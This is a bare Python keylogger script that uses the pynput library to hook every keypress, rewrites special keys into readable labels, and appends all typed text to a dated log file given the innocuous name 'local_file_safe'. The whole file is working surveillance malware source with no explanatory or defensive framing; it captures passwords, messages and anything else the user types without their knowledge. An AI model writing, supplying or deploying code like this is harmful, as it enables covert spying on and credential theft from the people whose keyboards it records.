from pynput.keyboard import Listener
import re
import datetime

fileLog = "local_file_safe"
date = datetime.datetime.now().strftime("%d-%m-%Y")
fileName = fileLog + date + ".txt"

def x(k):
    k = str(k)
    k = re.sub(r'\'', '', k)
    k = re.sub('Key.delete', ' Delete', k)
    k = re.sub('Key.space', ' ', k)
    k = re.sub('Key.esc', ' ', k)
    k = re.sub('Key.alt', ' ', k)
    k = re.sub('Key.ctrl', ' ', k)
    k = re.sub('Key.shift', ' ', k)
    k = re.sub('Key.enter', ' Enter ', k)
    k = re.sub('Key.backspace', ' ', k)
    k = re.sub('Key.up', ' up ', k)
    k = re.sub('Key.down', ' down ', k)
    k = re.sub('Key.left', ' left ', k)
    k = re.sub('Key.right', ' right ', k)
    k = re.sub('Key.tab', ' tab ', k)
    k = re.sub('Key.caps_lock', ' capslock ', k)
    k = re.sub('Key.cmd', ' botao_iniciar ', k)
    k = re.sub('Key.f1', ' f1 ', k)
    k = re.sub('Key.f2', ' f2 ', k)
    k = re.sub('Key.f3', ' f3 ', k)
    k = re.sub('Key.f4', ' f4 ', k)
    k = re.sub('Key.f5', ' f5 ', k)
    k = re.sub('Key.f6', ' f6 ', k)
    k = re.sub('Key.f7', ' f7 ', k)
    k = re.sub('Key.f8', ' f8 ', k)
    k = re.sub('Key.f9', ' f9 ', k)
    k = re.sub('Key.f10', ' f10 ', k)
    k = re.sub('Key.f11', ' f11 ', k)
    k = re.sub('Key.f12', ' f12 ', k)
    k = re.sub('<96>', ' 0 ', k)
    k = re.sub('<97>', ' 1 ', k)
    k = re.sub('<98>', ' 2 ', k)
    k = re.sub('<99>', ' 3 ', k)
    k = re.sub('<100>', ' 4 ', k)
    k = re.sub('<101>', ' 5 ', k)
    k = re.sub('<102>', ' 6 ', k)
    k = re.sub('<103>', ' 7 ', k)
    k = re.sub('<104>', ' 8 ', k)
    k = re.sub('<105>', ' 9 ', k)

    with open(fileName, "a") as log:
        log.write(k)

with Listener(on_press=x) as l:
    l.join()
